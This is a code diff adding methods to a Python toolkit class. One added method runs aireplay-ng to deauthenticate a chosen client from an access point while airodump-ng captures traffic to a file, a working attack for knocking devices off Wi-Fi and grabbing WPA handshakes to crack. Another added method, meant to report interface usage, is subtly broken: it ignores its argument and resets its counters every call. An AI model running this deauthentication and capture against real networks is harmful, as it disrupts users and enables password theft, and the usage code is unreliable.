@@ -22,6 +22,54 @@ class toolkit():
 			interfacesJson[idx] = {"idx": idx, "interfaceName": iface.name()}
 		return interfacesJson
 
+
+	async def deAuthAndCapture(interface, target_mac, ap_mac, capture_duration=10):
+		# Start deauthentication attack
+		deauth_command = ["aireplay-ng", "--deauth", "5", "-a", ap_mac, "-c", target_mac, interface]
+		deauth_process = await asyncio.create_subprocess_exec(*deauth_command)
+		
+		# Start capturing packets
+		capture_command = ["airodump-ng", interface, "--write", "handshake_capture"]
+		capture_process = await asyncio.create_subprocess_exec(*capture_command)
+		
+		# Wait for the capture duration
+		await asyncio.sleep(capture_duration)
+		
+		# Terminate processes
+		deauth_process.terminate()
+		capture_process.terminate()
+
+
+	
+	
+
+	def getInterfaceUsage(interface: int) -> dict:
+		def get_size(bytes):
+			"""
+			Returns size of bytes in a nice format
+			"""
+			for unit in ['', 'K', 'M', 'G', 'T', 'P']:
+				if bytes < 1024:
+					return f"{bytes:.2f}{unit}B"
+				bytes /= 1024
+		
+		# Define bytes_sent and bytes_recv
+		bytes_sent = 0  # Initial value
+		bytes_recv = 0  # Initial value
+		
+		# Get the stats again
+		io_2 = psutil.net_io_counters()
+		
+		# Calculate the difference in bytes sent and received
+		us, ds = io_2.bytes_sent - bytes_sent, io_2.bytes_recv - bytes_recv
+		
+		# Update the bytes_sent and bytes_recv for the next iteration
+		bytes_sent, bytes_recv = io_2.bytes_sent, io_2.bytes_recv
+		
+		# Return the interface usage as a dictionary
+		return {"upload": get_size(us), "download": get_size(ds)}
+
+
 	def get_cpu_temperature():
 		try:
 			temperatures = CPUTemperature().temperature
